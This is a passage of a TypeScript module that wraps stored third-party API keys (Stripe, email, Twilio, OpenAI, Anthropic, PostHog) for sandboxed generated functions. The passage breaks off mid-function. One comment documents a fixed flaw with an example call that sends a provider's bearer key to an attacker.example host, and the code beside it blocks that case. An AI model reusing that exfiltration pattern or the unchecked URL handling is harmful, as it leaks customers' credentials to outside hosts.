/**
 * INTEGRATION CONTEXT BUILDER
 * ============================
 * Builds the ctx.integrations object available inside AI function sandboxes.
 *
 * When a project has stored an API key for Stripe, Resend, OpenAI, Anthropic,
 * PostHog, etc., this module decrypts it server-side and wraps it in a safe,
 * typed API that generated functions can call.
 *
 * INVARIANT: every provider the platform auto-wires (see lib/ai/minimal-executor
 * `executeStoreIntegrationKey` and lib/integrations/*.executor.ts) MUST have a
 * matching runtime wrapper here. A provider that is advertised + auto-wired but
 * not built here is a "phantom integration" — every generated function that
 * calls it fails at runtime. This file is the single source of truth for the
 * ctx.integrations surface.
 *
 * Available in AI functions as:
 *   ctx.integrations.stripe.createPaymentIntent(amountCents, currency, customerId?)
 *   ctx.integrations.stripe.createCheckoutSession({ lineItems, successUrl, cancelUrl, ... })
 *   ctx.integrations.stripe.createCustomer(email, name?, metadata?)
 *   ctx.integrations.stripe.refund(paymentIntentId, amountCents?)
 *   ctx.integrations.stripe.cancelSubscription(subscriptionId)
 *   ctx.integrations.stripe.listCustomers(email?)
 *   ctx.integrations.email.send({ to, subject, html, from? })
 *   ctx.integrations.twilio.sendSms({ to, body })
 *   ctx.integrations.openai.complete(prompt, { model?, maxTokens?, system? })
 *   ctx.integrations.openai.embed(text)
 *   ctx.integrations.anthropic.complete(prompt, { model?, maxTokens?, system?, effort? })
 *   ctx.integrations.posthog.capture({ distinctId, event, properties? })
 *   ctx.integrations.posthog.identify({ distinctId, properties })
 *   ctx.integrations.posthog.isFeatureEnabled(flagKey, distinctId)
 *   ctx.integrations.isConnected(name)  → boolean
 */

import { randomBytes } from 'crypto'
import { getIntegrationKey } from '@/lib/services/integrationKeyStore'
import { safeFetch } from '@/lib/security/outbound-guard'
import {
  INTEGRATION_PROVIDERS,
  genericRequestProviders,
  type ProviderSpec,
} from './integration-registry'
import Anthropic from '@anthropic-ai/sdk'
import { AI_HELPER_DEFAULTS } from './model-defaults'

// ── Types exposed to generated functions ──────────────────────────────────────

/**
 * Universal escape hatch present on EVERY connected provider. Guarantees that a
 * provider which stores a key is never "phantom": even without a hand-written
 * typed helper, `ctx.integrations.<id>.request(...)` makes a signed call.
 *
 * `path` is relative to the provider's base URL, and may repeat the base's
 * version as the provider's docs write it (resolveProviderUrl). An object
 * `body` is encoded as the provider takes it (encodeBody): JSON, a form for
 * Stripe, multipart for Stability, or what the call's Content-Type names.
 */
export interface GenericIntegration {
  request(
    method: string,
    path: string,
    body?: unknown,
    headers?: Record<string, string>,
  ): Promise<any>
}

export interface StripeCheckoutLineItem {
  /** An existing Stripe Price id (price_…). Use this OR priceData. */
  price?: string
  /** Inline price — use when no Stripe Price object exists. */
  priceData?: {
    currency: string
    unitAmount: number
    productName: string
    recurringInterval?: 'day' | 'week' | 'month' | 'year'
  }
  quantity: number
}

export interface StripeIntegration {
  createPaymentIntent(amountCents: number, currency: string, customerId?: string): Promise<{ id: string; clientSecret: string; status: string }>
  createCheckoutSession(opts: {
    lineItems: StripeCheckoutLineItem[]
    successUrl: string
    cancelUrl: string
    mode?: 'payment' | 'subscription'
    customerId?: string
    customerEmail?: string
    metadata?: Record<string, string>
  }): Promise<{ id: string; url: string }>
  createCustomer(email: string, name?: string, metadata?: Record<string, string>): Promise<{ id: string; email: string }>
  refund(paymentIntentId: string, amountCents?: number): Promise<{ id: string; status: string }>
  cancelSubscription(subscriptionId: string): Promise<{ id: string; status: string }>
  listCustomers(email?: string): Promise<Array<{ id: string; email: string; name: string | null }>>
  retrievePaymentIntent(paymentIntentId: string): Promise<Record<string, any>>
}

export interface EmailIntegration {
  send(opts: { to: string | string[]; subject: string; html?: string; from?: string; text?: string }): Promise<{ id: string }>
}

export interface TwilioIntegration {
  sendSms(opts: { to: string; body: string }): Promise<{ sid: string; status: string }>
}

/**
 * What a completion helper takes besides the prompt. Anything left out comes
 * from AI_HELPER_DEFAULTS (model-defaults.ts).
 */
export interface CompleteOptions {
  /** The provider's model id. */
  model?: string
  /** The most tokens the reply may use. On Claude, thinking counts toward it too. */
  maxTokens?: number
  /** A system prompt. */
  system?: string
}

export interface OpenAIIntegration {
  /** Single-turn chat completion. */
  complete(prompt: string, options?: CompleteOptions): Promise<string>
  /** The positional form functions were written with, still accepted. */
  complete(prompt: string, maxTokens?: number, systemPrompt?: string): Promise<string>
  embed(text: string): Promise<number[]>
}

export interface AnthropicCompleteOptions extends CompleteOptions {
  /** How much the model thinks before it answers. */
  effort?: 'low' | 'medium' | 'high' | 'xhigh' | 'max'
}

export interface AnthropicIntegration {
  /** Single-turn completion. Anthropic has no embeddings API — use openai.embed for vectors. */
  complete(prompt: string, options?: AnthropicCompleteOptions): Promise<string>
  /** The positional form functions were written with, still accepted. */
  complete(prompt: string, maxTokens?: number, systemPrompt?: string): Promise<string>
}

export interface PostHogIntegration {
  /** Record a product-analytics event for a user. */
  capture(opts: { distinctId: string; event: string; properties?: Record<string, any> }): Promise<{ ok: boolean }>
  /** Attach/refresh person properties on a user. */
  identify(opts: { distinctId: string; properties: Record<string, any> }): Promise<{ ok: boolean }>
  /** Evaluate a feature flag for a user. Returns false if the flag is off or unknown. */
  isFeatureEnabled(flagKey: string, distinctId: string): Promise<boolean>
}

export interface IntegrationContext {
  stripe?: StripeIntegration & Partial<GenericIntegration>
  email?: EmailIntegration
  twilio?: TwilioIntegration
  openai?: OpenAIIntegration & Partial<GenericIntegration>
  anthropic?: AnthropicIntegration & Partial<GenericIntegration>
  posthog?: PostHogIntegration
  isConnected(name: string): boolean
  /**
   * Generic-request-only providers (replicate, runway, stability, onesignal,
   * resend, sendgrid, …) live here by canonical id. Rich providers above ALSO
   * appear here so iteration over the object is complete.
   */
  [provider: string]: any
}

// ── Form encoder ───────────────────────────────────────────────────────────────
// Stripe's API uses application/x-www-form-urlencoded with PHP-style nesting:
//   line_items[0][price]=price_x&line_items[0][quantity]=1&metadata[k]=v
// This walks arrays + objects recursively so nested params encode correctly.
// The Stripe helpers and request() for any form-encoded body both use it.

function encodeForm(obj: Record<string, any>): string {
  const pairs: string[] = []
  const walk = (key: string, val: any): void => {
    if (val === undefined || val === null) return
    if (Array.isArray(val)) {
      val.forEach((v, i) => walk(`${key}[${i}]`, v))
    } else if (typeof val === 'object') {
      for (const [k, v] of Object.entries(val)) walk(`${key}[${k}]`, v)
    } else {
      pairs.push(`${encodeURIComponent(key)}=${encodeURIComponent(String(val))}`)
    }
  }
  for (const [k, v] of Object.entries(obj)) walk(k, v)
  return pairs.join('&')
}

// ── Stripe wrapper ─────────────────────────────────────────────────────────────

function buildStripeIntegration(secretKey: string): StripeIntegration {
  const STRIPE_BASE = 'https://api.stripe.com/v1'
  const headers = {
    'Authorization': `Bearer ${secretKey}`,
    'Content-Type': 'application/x-www-form-urlencoded',
  }

  async function stripePost(path: string, params: Record<string, any>): Promise<any> {
    const res = await fetch(`${STRIPE_BASE}${path}`, {
      method: 'POST',
      headers,
      body: encodeForm(params),
      signal: AbortSignal.timeout(8000),
    })
    const data = await res.json()
    if (data.error) throw new Error(`Stripe error: ${data.error.message}`)
    return data
  }

  async function stripeGet(path: string, params?: Record<string, any>): Promise<any> {
    const qs = params ? '?' + new URLSearchParams(params as any).toString() : ''
    const res = await fetch(`${STRIPE_BASE}${path}${qs}`, {
      method: 'GET',
      headers,
      signal: AbortSignal.timeout(8000),
    })
    const data = await res.json()
    if (data.error) throw new Error(`Stripe error: ${data.error.message}`)
    return data
  }

  return {
    async createPaymentIntent(amountCents, currency, customerId) {
      const params: Record<string, any> = { amount: amountCents, currency }
      if (customerId) params.customer = customerId
      const pi = await stripePost('/payment_intents', params)
      return { id: pi.id, clientSecret: pi.client_secret, status: pi.status }
    },

    async createCheckoutSession(opts) {
      if (!Array.isArray(opts.lineItems) || opts.lineItems.length === 0) {
        throw new Error('createCheckoutSession requires at least one lineItem')
      }
      if (!opts.successUrl || !opts.cancelUrl) {
        throw new Error('createCheckoutSession requires successUrl and cancelUrl')
      }

      // Infer mode: subscription when any line item is recurring, else payment.
      const isRecurring = opts.lineItems.some(li => li.priceData?.recurringInterval)
      const mode = opts.mode ?? (isRecurring ? 'subscription' : 'payment')

      const line_items = opts.lineItems.map((li) => {
        if (li.price) {
          return { price: li.price, quantity: li.quantity }
        }
        if (!li.priceData) {
          throw new Error('Each lineItem needs either `price` or `priceData`')
        }
        const pd = li.priceData
        const price_data: Record<string, any> = {
          currency: pd.currency,
          unit_amount: pd.unitAmount,
          product_data: { name: pd.productName },
        }
        if (pd.recurringInterval) {
          price_data.recurring = { interval: pd.recurringInterval }
        }
        return { price_data, quantity: li.quantity }
      })

      const params: Record<string, any> = {
        mode,
        line_items,
        success_url: opts.successUrl,
        cancel_url: opts.cancelUrl,
      }
      if (opts.customerId) params.customer = opts.customerId
      else if (opts.customerEmail) params.customer_email = opts.customerEmail
      if (opts.metadata) params.metadata = opts.metadata

      const session = await stripePost('/checkout/sessions', params)
      return { id: session.id, url: session.url }
    },

    async createCustomer(email, name, metadata) {
      const params: Record<string, any> = { email }
      if (name) params.name = name
      if (metadata) params.metadata = metadata
      const c = await stripePost('/customers', params)
      return { id: c.id, email: c.email }
    },

    async refund(paymentIntentId, amountCents) {
      const params: Record<string, any> = { payment_intent: paymentIntentId }
      if (amountCents) params.amount = amountCents
      const r = await stripePost('/refunds', params)
      return { id: r.id, status: r.status }
    },

    async cancelSubscription(subscriptionId) {
      const sub = await stripePost(`/subscriptions/${subscriptionId}/cancel`, {})
      return { id: sub.id, status: sub.status }
    },

    async listCustomers(email) {
      const params: Record<string, any> = { limit: 10 }
      if (email) params.email = email
      const list = await stripeGet('/customers', params)
      return (list.data || []).map((c: any) => ({ id: c.id, email: c.email, name: c.name }))
    },

    async retrievePaymentIntent(paymentIntentId) {
      return stripeGet(`/payment_intents/${paymentIntentId}`)
    },
  }
}

// ── Email wrapper (Resend-first, fallback SendGrid) ───────────────────────────

export function buildEmailIntegration(
  resendKey: string | null,
  sendgridKey: string | null,
  defaultFrom?: string | null,
): EmailIntegration {
  return {
    async send({ to, subject, html, from, text }) {
      const sender = from || defaultFrom
      if (!sender) {
        throw new Error(
          'No sender email configured. Provide "from" in email.send({ from, ... }) or configure a verified sender when connecting Resend/SendGrid.',
        )
      }
      const toArr = Array.isArray(to) ? to : [to]

      if (resendKey) {
        const res = await fetch('https://api.resend.com/emails', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${resendKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ from: sender, to: toArr, subject, html, text }),
          signal: AbortSignal.timeout(8000),
        })
        const data = await res.json()
        if (data.statusCode && data.statusCode >= 400) throw new Error(`Resend error: ${data.message}`)
        return { id: data.id || 'sent' }
      }

      if (sendgridKey) {
        const content: Array<{ type: string; value: string }> = []
        if (text) content.push({ type: 'text/plain', value: text })
        if (html) content.push({ type: 'text/html', value: html })
        if (content.length === 0) content.push({ type: 'text/html', value: '' })

        const res = await fetch('https://api.sendgrid.com/v3/mail/send', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${sendgridKey}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            personalizations: [{ to: toArr.map(e => ({ email: e })) }],
            from: { email: sender },
            subject,
            content,
          }),
          signal: AbortSignal.timeout(8000),
        })
        if (!res.ok && res.status !== 202) {
          const err = await res.text()
          throw new Error(`SendGrid error: ${err}`)
        }
        return { id: `sg_${Date.now()}` }
      }

      throw new Error('No email integration connected. Add Resend or SendGrid key in Integrations.')
    },
  }
}

// ── Twilio wrapper ─────────────────────────────────────────────────────────────

function buildTwilioIntegration(accountSid: string, authToken: string, fromNumber: string): TwilioIntegration {
  return {
    async sendSms({ to, body }) {
      const res = await fetch(
        `https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json`,
        {
          method: 'POST',
          headers: {
            'Authorization': `Basic ${Buffer.from(`${accountSid}:${authToken}`).toString('base64')}`,
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({ To: to, From: fromNumber, Body: body }).toString(),
          signal: AbortSignal.timeout(8000),
        }
      )
      if (!res.ok) {
        const err = await res.json().catch(() => ({}))
        throw new Error(`Twilio error: ${err.message || err.error_message || `HTTP ${res.status}`}`)
      }
      const data = await res.json()
      return { sid: data.sid, status: data.status }
    },
  }
}

// ── OpenAI wrapper ─────────────────────────────────────────────────────────────

/**
 * complete()'s options, from either form a function calls it with:
 * complete(prompt, { model?, maxTokens?, system? }) or the positional
 * complete(prompt, maxTokens?, systemPrompt?) generated code was written with.
 */
function completeOptions<T extends CompleteOptions>(second: unknown, systemPrompt: unknown): T {
  if (second !== null && typeof second === 'object') return second as T
  return {
    ...(typeof second === 'number' ? { maxTokens: second } : {}),
    ...(typeof systemPrompt === 'string' ? { system: systemPrompt } : {}),
  } as T
}

/** The model a function named, or the default when it named none. */
function modelOf(named: unknown, fallback: string): string {
  return typeof named === 'string' && named.trim() ? named.trim() : fallback
}

export function buildOpenAIIntegration(apiKey: string): OpenAIIntegration {
  return {
    async complete(prompt: string, second?: number | CompleteOptions, systemPrompt?: string) {
      const options = completeOptions<CompleteOptions>(second, systemPrompt)
      const defaults = AI_HELPER_DEFAULTS.openai.complete
      const res = await fetch('https://api.openai.com/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${apiKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          model: modelOf(options.model, defaults.model),
          messages: [
            ...(options.system ? [{ role: 'system', content: options.system }] : []),
            { role: 'user', content: prompt },
          ],
          // max_tokens is deprecated, and OpenAI's reasoning models refuse it.
          max_completion_tokens: options.maxTokens ?? defaults.maxTokens,
        }),
        signal: AbortSignal.timeout(15000),
      })
      const data = await res.json()
      if (data.error) throw new Error(`OpenAI error: ${data.error.message}`)
      return data.choices?.[0]?.message?.content || ''
    },

    async embed(text) {
      const res = await fetch('https://api.openai.com/v1/embeddings', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${apiKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ model: AI_HELPER_DEFAULTS.openai.embed.model, input: text }),
        signal: AbortSignal.timeout(10000),
      })
      const data = await res.json()
      if (data.error) throw new Error(`OpenAI error: ${data.error.message}`)
      return data.data?.[0]?.embedding || []
    },
  }
}

// ── Anthropic wrapper ──────────────────────────────────────────────────────────
// Anthropic exposes the Messages API only — there is NO embeddings endpoint.
// Functions that need vectors must use ctx.integrations.openai.embed().

/**
 * An SDK error as this helper has always thrown them, "Anthropic error: …",
 * with what the API said and its status. A retired or unknown model is a 404
 * whose message names the model.
 */
function anthropicError(err: unknown): Error {
  if (err instanceof Anthropic.APIError && err.status) {
    const said = (err.error as { error?: { message?: unknown } } | undefined)?.error?.message
    if (typeof said === 'string' && said) return new Error(`Anthropic error: ${said} (HTTP ${err.status})`)
  }
  return new Error(`Anthropic error: ${err instanceof Error ? err.message : String(err)}`)
}

export function buildAnthropicIntegration(apiKey: string): AnthropicIntegration {
  // The official SDK, which reads globalThis.fetch when the client is made. Its
  // base URL and bearer token default to this server's ANTHROPIC_BASE_URL and
  // ANTHROPIC_AUTH_TOKEN, which are Backenly's own settings, so both are pinned:
  // the project's key goes to api.anthropic.com, alone. No retries, as before:
  // the calling function decides what an error means.
  const client = new Anthropic({
    apiKey,
    authToken: null,
    baseURL: 'https://api.anthropic.com',
    maxRetries: 0,
    timeout: 20_000,
  })
  return {
    async complete(prompt: string, second?: number | AnthropicCompleteOptions, systemPrompt?: string) {
      const options = completeOptions<AnthropicCompleteOptions>(second, systemPrompt)
      const defaults = AI_HELPER_DEFAULTS.anthropic.complete
      const model = modelOf(options.model, defaults.model)
      // The default effort goes with the default model only (model-defaults.ts).
      const effort = options.effort ?? (model === defaults.model ? defaults.effort : undefined)
      const maxTokens = options.maxTokens ?? defaults.maxTokens

      let message: Anthropic.Message
      try {
        message = await client.messages.create({
          model,
          max_tokens: maxTokens,
          messages: [{ role: 'user', content: prompt }],
          ...(options.system ? { system: options.system } : {}),
          ...(effort ? { output_config: { effort } } : {}),
        })
      } catch (err) {
        throw anthropicError(err)
      }

      if (message.stop_reason === 'refusal') {
        const category = message.stop_details?.category
        throw new Error(`Anthropic declined this prompt (stop_reason "refusal"${category ? `, category "${category}"` : ''}).`)
      }
      // A reply can begin with thinking blocks: the answer is the text blocks.
      const text = message.content
        .filter((block): block is Anthropic.TextBlock => block.type === 'text')
        .map((block) => block.text)
        .join('')
      if (!text && message.stop_reason === 'max_tokens') {
        throw new Error(
          `Anthropic reached maxTokens (${maxTokens}) before writing any reply; its thinking counts toward it. ` +
            'Raise maxTokens, or lower effort.',
        )
      }
      return text
    },
  }
}

// ── PostHog wrapper ────────────────────────────────────────────────────────────
// Server-side product analytics: event capture, person identify, feature flags.
// Uses the project API key (phc_…), which is write-scoped and safe server-side.

function buildPostHogIntegration(apiKey: string, host: string): PostHogIntegration {
  const base = host.replace(/\/+$/, '')

  async function captureRaw(payload: Record<string, any>): Promise<{ ok: boolean }> {
    const res = await fetch(`${base}/capture/`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ api_key: apiKey, ...payload }),
      signal: AbortSignal.timeout(8000),
    })
    if (!res.ok) {
      const err = await res.text().catch(() => '')
      throw new Error(`PostHog error: HTTP ${res.status} ${err}`.trim())
    }
    return { ok: true }
  }

  return {
    async capture({ distinctId, event, properties }) {
      if (!distinctId) throw new Error('posthog.capture requires distinctId')
      if (!event) throw new Error('posthog.capture requires event')
      return captureRaw({
        event,
        distinct_id: distinctId,
        properties: properties ?? {},
        timestamp: new Date().toISOString(),
      })
    },

    async identify({ distinctId, properties }) {
      if (!distinctId) throw new Error('posthog.identify requires distinctId')
      return captureRaw({
        event: '$identify',
        distinct_id: distinctId,
        properties: { $set: properties ?? {} },
        timestamp: new Date().toISOString(),
      })
    },

    async isFeatureEnabled(flagKey, distinctId) {
      if (!flagKey || !distinctId) return false
      const res = await fetch(`${base}/decide/?v=3`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ api_key: apiKey, distinct_id: distinctId }),
        signal: AbortSignal.timeout(8000),
      })
      if (!res.ok) return false
      const data = await res.json().catch(() => ({} as any))
      const flag = data?.featureFlags?.[flagKey]
      // PostHog returns true | false | a variant string. Treat any non-false as on.
      return flag !== undefined && flag !== false
    },
  }
}

/**
 * Resolve a caller-supplied `path` against the provider's base URL.
 *
 * ── The bug this replaces ───────────────────────────────────────────────────
 *
 *   const url = /^https?:\/\//i.test(path) ? path : `${base}${path}`
 *
 * An absolute URL in `path` was used verbatim — and the request still carried
 * `spec.buildHeaders(key)`, which is the customer's provider API key. So
 *
 *   ctx.integrations.openai.request('GET', 'https://attacker.example/')
 *
 * sent a live `Authorization: Bearer sk-…` to an attacker-chosen host. That is
 * credential exfiltration written into the API surface, and it is strictly
 * worse than the SSRF on `ctx.http.*` because the request is pre-authenticated
 * with a secret the function is never allowed to read directly.
 *
 * The fix keeps the legitimate case — some APIs return absolute next-page URLs
 * on their own host — by requiring an absolute path to share the provider's
 * origin. Anything else is refused before a credential is attached.
 *
 * A relative path is appended to the base, never resolved against it, so it
 * cannot leave the provider's host, and a path that repeats the base's own
 * path is appended once (withoutBasePath).
 */
export function resolveProviderUrl(base: string, path: string, providerId: string): string {
  const p = String(path ?? '')

  if (!/^[a-z][a-z0-9+.-]*:/i.test(p)) {
    return `${base}${withoutBasePath(base, p.startsWith('/') ? p : `/${p}`)}`
  }

  let target: URL
  try {
    target = new URL(p)
  } catch {
    throw new Error(`${providerId}.request(): "${p.slice(0, 120)}" is not a valid URL.`)
  }

  let baseOrigin: string
  try {
    baseOrigin = new URL(base).origin
  } catch {
    throw new Error(`${providerId}.request(): provider has no usable base URL.`)
  }

  if (target.origin !== baseOrigin) {
    throw new Error(
      `${providerId}.request(): refusing to send ${providerId} credentials to ${target.origin}. ` +
        `Absolute URLs must stay on ${baseOrigin}. Use ctx.http.get/post for other hosts.`,
    )
  }

  return target.toString()
}

/**
 * A relative path without the base URL's own path, when it starts with it.
 *
 * Most bases end in their API version (https://api.openai.com/v1,
 * https://api.sendgrid.com/v3, https://onesignal.com/api/v1), and providers
 * document their paths with it, so OpenAI's '/v1/chat/completions' was sent to
 * /v1/v1/chat/completions and answered 404. Only whole segments are dropped:
 * '/v10/x' on a '/v1' base is left as it is.
 */
function withoutBasePath(base: string, relative: string): string {
  let basePath: string
  try {
    basePath = new URL(base).pathname.replace(/\/+$/, '')
  } catch {
    return relative
  }
  if (!basePath || !relative.startsWith(basePath)) return relative
  const next = relative.charAt(basePath.length)
  return next === '' || next === '/' || next === '?' || next === '#' ? relative.slice(basePath.length) : relative
}

// ── Request bodies ─────────────────────────────────────────────────────────────

const JSON_TYPE = 'application/json'
const FORM_TYPE = 'application/x-www-form-urlencoded'
const MULTIPART_TYPE = 'multipart/form-data'
const BYTES_TYPE = 'application/octet-stream'

type BodyEncoding = NonNullable<ProviderSpec['bodyEncoding']>

/** The Content-Type a call's own headers name, whatever its case. */
function contentTypeOf(headers: Record<string, string>): string | undefined {
  const name = Object.keys(headers).find((h) => h.toLowerCase() === 'content-type')
  return name ? headers[name] : undefined
}

function withoutContentType(headers: Record<string, string>): Record<string, string> {
  return Object.fromEntries(Object.entries(headers).filter(([h]) => h.toLowerCase() !== 'content-type'))
}

function encodingOfType(type: string): BodyEncoding {
  const t = type.trim().toLowerCase()
  if (t.startsWith(MULTIPART_TYPE)) return 'multipart'
  if (t.startsWith(FORM_TYPE)) return 'form'
  return 'json'
}

/**
 * A request() body as the provider takes it.
 *
 * Every body used to be JSON.stringify'd and sent as application/json. Stripe
 * takes only form-encoded bodies, so every Stripe write outside the typed
 * helpers failed, and Stability's image endpoints take only multipart, so the
 * registry's own Stability example could not work. A Content-Type the call
 * names chooses the encoding; otherwise the provider's (spec.bodyEncoding),
 * JSON unless it says otherwise. A string is sent as it is.
 */
function encodeBody(
  spec: ProviderSpec,
  body: unknown,
  callerType: string | undefined,
): { body: string | Uint8Array; contentType: string } {
  const encoding = callerType ? encodingOfType(callerType) : spec.bodyEncoding ?? 'json'
  if (typeof body === 'string') {
    return { body, contentType: callerType ?? (encoding === 'form' ? FORM_TYPE : JSON_TYPE) }
  }
  if (encoding === 'json') return { body: JSON.stringify(body), contentType: callerType ?? JSON_TYPE }

  if (!body || typeof body !== 'object' || Array.isArray(body) || body instanceof Uint8Array) {
    throw new Error(`${spec.id}.request(): a ${encoding === 'form' ? 'form' : 'multipart'} body must be an object of fields.`)
  }
  if (encoding === 'form') return { body: encodeForm(body as Record<string, unknown>), contentType: FORM_TYPE }
  const boundary = `BackenlyFormBoundary${randomBytes(16).toString('hex')}`
  return {
    body: encodeMultipart(body as Record<string, unknown>, boundary, spec.id),
    contentType: `${MULTIPART_TYPE}; boundary=${boundary}`,
  }
}

/**
 * multipart/form-data. A field is a string, number or boolean, a list of those
 * (sent as repeated fields), or a file. A function cannot build FormData or a
 * Blob in the sandbox, and its arguments reach this process as plain values,
 * so a file is described: { base64, filename?, contentType? }, or { data,
 * filename?, contentType? } with text or bytes as data. Bytes alone are a file
 * too.
 */
function encodeMultipart(fields: Record<string, unknown>, boundary: string, providerId: string): Buffer {
  const parts: Buffer[] = []
  const add = (name: string, value: unknown): void => {
    if (value === undefined || value === null) return
    const disposition = `--${boundary}\r\nContent-Disposition: form-data; name="${dispositionValue(name)}"`
    const file = multipartFile(value)
    if (file) {
      if (/[\r\n]/.test(file.contentType)) {
        throw new Error(`${providerId}.request(): the content type of file field "${name}" must be one line.`)
      }
      parts.push(
        Buffer.from(`${disposition}; filename="${dispositionValue(file.filename)}"\r\nContent-Type: ${file.contentType}\r\n\r\n`),
        file.bytes,
        Buffer.from('\r\n'),
      )
      return
    }
    if (typeof value === 'object') {
      throw new Error(
        `${providerId}.request(): multipart field "${name}" must be a string, number, boolean, ` +
          'or a file ({ base64, filename?, contentType? } or { data, filename?, contentType? }).',
      )
    }
    parts.push(Buffer.from(`${disposition}\r\n\r\n${String(value)}\r\n`))
  }
  for (const [name, value] of Object.entries(fields)) {
    if (Array.isArray(value)) value.forEach((v) => add(name, v))
    else add(name, value)
  }
  parts.push(Buffer.from(`--${boundary}--\r\n`))
  return Buffer.concat(parts)
}

/** A field name or filename inside Content-Disposition, escaped as browsers escape it. */
function dispositionValue(s: string): string {
  return s.replace(/"/g, '%22').replace(/\r/g, '%0D').replace(/\n/g, '%0A')
}

function bytesOf(v: unknown): Buffer | null {
  if (v instanceof Uint8Array) return Buffer.from(v.buffer, v.byteOffset, v.byteLength)
  if (v instanceof ArrayBuffer) return Buffer.from(v)
  return null
}

/** The file a multipart field describes, or null for a field that is not one. */
function multipartFile(value: unknown): { bytes: Buffer; filename: string; contentType: string } | null {
  const raw = bytesOf(value)
  if (raw) return { bytes: raw, filename: 'file', contentType: BYTES_TYPE }
  if (!value || typeof value !== 'object' || Array.isArray(value)) return null
  const f = value as { base64?: unknown; data?: unknown; filename?: unknown; contentType?: unknown }
  const bytes =
    typeof f.base64 === 'string' ? Buffer.from(f.base64, 'base64')
    : typeof f.data === 'string' ? Buffer.from(f.data, 'utf8')
    : bytesOf(f.data)
  if (!bytes) return null
  return {
    bytes,
    filename: typeof f.filename === 'string' && f.filename ? f.filename : 'file',
    contentType: typeof f.contentType === 'string' && f.contentType ? f.contentType : BYTES_TYPE,
  }
}

// ── Universal request() builder ────────────────────────────────────────────────
// Works for ANY registry provider that declares a baseUrl + buildHeaders. This is
// the anti-phantom primitive: a stored key always yields a callable surface.

function buildGenericRequest(
  spec: ProviderSpec,
  key: string,
  auxValue: string | null,
): GenericIntegration {
  const base = (spec.baseUrl ?? '').replace(/\/+$/, '')
  return {
    async request(method, path, body, headers) {
      const m = String(method || 'GET').toUpperCase()
      const url = resolveProviderUrl(base, path, spec.id)
      const callerHeaders = headers ?? {}
      const callerType = contentTypeOf(callerHeaders)

      // Inject aux fields (e.g. OneSignal app_id) into object bodies only.
      let finalBody = body
      if (spec.injectBody && finalBody && typeof finalBody === 'object' && !Array.isArray(finalBody)) {
        finalBody = { ...spec.injectBody(auxValue), ...(finalBody as Record<string, unknown>) }
      }

      const hasBody = finalBody !== undefined && finalBody !== null && m !== 'GET' && m !== 'HEAD'
      const encoded = hasBody ? encodeBody(spec, finalBody, callerType) : null

      // Provider auth headers, any per-call overrides, then the body's own type.
      const finalHeaders: Record<string, string> = {
        ...(spec.buildHeaders ? spec.buildHeaders(key) : {}),
        ...withoutContentType(callerHeaders),
        'Content-Type': encoded?.contentType ?? callerType ?? JSON_TYPE,
      }

      const res = await safeFetch(url, {
        method: m,
        headers: finalHeaders,
        body: encoded?.body,
        timeoutMs: 20000,
      })

      const text = await res.text()
      let data: any
      try { data = text ? JSON.parse(text) : null } catch { data = text }

      if (!res.ok) {
        const detail = typeof data === 'string' ? data : JSON.stringify(data)
        throw new Error(`${spec.displayName} API ${res.status}: ${detail?.slice?.(0, 500) ?? detail}`)
      }
      return data
    },
  }
}

// ── Main builder ───────────────────────────────────────────────────────────────

const DEFAULT_POSTHOG_HOST = 'https://us.i.posthog.com'

/**
 * Build the ctx.integrations object for a given project.
 * Only includes integrations that have stored keys — safe to call for every function.
 */
export async function buildIntegrationContext(projectId: string): Promise<IntegrationContext> {
  const connected = new Set<string>()

  // Load all integration keys in parallel
  const [stripeKey, resendKey, sendgridKey, openaiKey, anthropicKey, twilioRaw, posthogKey, posthogHost, emailFromVault] =
    await Promise.all([
      getIntegrationKey(projectId, 'stripe').catch(() => null),
      getIntegrationKey(projectId, 'resend').catch(() => null),
      getIntegrationKey(projectId, 'sendgrid').catch(() => null),
      getIntegrationKey(projectId, 'openai').catch(() => null),
      getIntegrationKey(projectId, 'anthropic').catch(() => null),
      getIntegrationKey(projectId, 'twilio').catch(() => null),
      getIntegrationKey(projectId, 'posthog').catch(() => null),
      getIntegrationKey(projectId, 'posthog_host').catch(() => null),
      getIntegrationKey(projectId, 'email_from').catch(() => null),
    ])

  const ctx: IntegrationContext = {
    isConnected(name: string) {
      return connected.has(name.toLowerCase())
    },
  }

  if (stripeKey) {
    ctx.stripe = buildStripeIntegration(stripeKey)
    connected.add('stripe')
  }

  if (resendKey || sendgridKey) {
    let defaultFrom = emailFromVault
    if (!defaultFrom) {
      try {
        const { prisma } = await import('@/lib/db/prisma')
        const project = await prisma.project.findUnique({
          where: { id: projectId },
          select: { activeIntegrations: true },
        })
        const active = (project?.activeIntegrations as Record<string, any>) ?? {}
        defaultFrom = active.resend?.fromEmail ?? active.sendgrid?.fromEmail ?? active.email?.fromEmail ?? null
      } catch {
        // non-fatal
      }
    }

    ctx.email = buildEmailIntegration(resendKey, sendgridKey, defaultFrom)
    connected.add('email')
    if (resendKey) connected.add('resend')
    if (sendgridKey) connected.add('sendgrid')
  }

  if (openaiKey) {
    ctx.openai = buildOpenAIIntegration(openaiKey)
    connected.add('openai')
  }

  if (anthropicKey) {
    ctx.anthropic = buildAnthropicIntegration(anthropicKey)
    connected.add('anthropic')
  }

  if (twilioRaw) {
    // Twilio key stored as "accountSid:authToken:fromNumber"
    const parts = twilioRaw.split(':')
    if (parts.length >= 3) {
      ctx.twilio = buildTwilioIntegration(parts[0], parts[1], parts[2])
      connected.add('twilio')
      connected.add('sms')
    }
  }

  if (posthogKey) {
    ctx.posthog = buildPostHogIntegration(posthogKey, posthogHost || DEFAULT_POSTHOG_HOST)
    connected.add('posthog')
  }

  // ── Universal request() for every connected provider ─────────────────────────
  // Registry-driven: any provider with a baseUrl + auth gets a .request() helper.
  // This is what makes Replicate/Runway/Stability/OneSignal (and any future
  // provider) work in generated functions — no per-provider wiring needed.
  await Promise.all(
    genericRequestProviders().map(async (spec) => {
      // First stored key wins across the provider's vault ids.
